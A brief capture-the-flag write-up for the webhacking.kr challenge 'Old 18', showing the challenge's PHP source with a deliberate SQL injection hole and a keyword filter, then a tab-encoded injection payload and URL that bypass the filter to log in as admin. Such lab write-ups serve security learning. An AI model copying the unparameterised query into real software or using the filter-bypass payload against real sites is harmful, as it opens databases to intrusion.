# Old 18    SQLi (Tab)

URL: [https://webhacking.kr/challenge/web-32/?view_source=1](https://webhacking.kr/challenge/web-32/?view_source=1)

![pasted-image-20240528152316.png](/assets/ctf/webhacking.kr/pasted-image-20240528152316.png)

```php
<?php
if($_GET['no']){
  $db = dbconnect();
  if(preg_match("/ |\/|\(|\)|\||&|select|from|0x/i",$_GET['no'])) exit("no hack");
  $result = mysqli_fetch_array(mysqli_query($db,"select id from chall18 where id='guest' and no=$_GET[no]")); // admin's no = 2

  if($result['id']=="guest") echo "hi guest";
  if($result['id']=="admin"){
    solve(18);
    echo "hi admin!";
  }
}
?>
```

Looks like we are restricted to spaces, but not tabs. Mysql doesn't care which space we use so we can use tabs.

```python
>>> print("0 OR no=2 -- -".replace(' ', '%' + format(ord('\t'), '02X')))
0%09OR%09no=2%09--%09-
```

`https://webhacking.kr/challenge/web-32/index.php?no=0%09OR%09no=2%09--%09-`